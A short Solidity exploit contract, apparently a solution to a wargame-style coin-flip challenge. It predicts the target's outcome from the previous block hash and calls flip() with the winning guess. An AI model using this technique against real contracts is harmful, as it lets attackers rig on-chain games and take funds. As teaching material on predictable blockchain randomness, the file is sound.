// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
   function consecutiveWins() external view returns (uint256);
   function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack(address contract_addr) public {
    // calculate flip result from original code
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    // call coinflip contract
    (bool success,) = contract_addr.call(abi.encodeWithSignature("flip(bool)", side));
    require(success, "flip success");
  }
}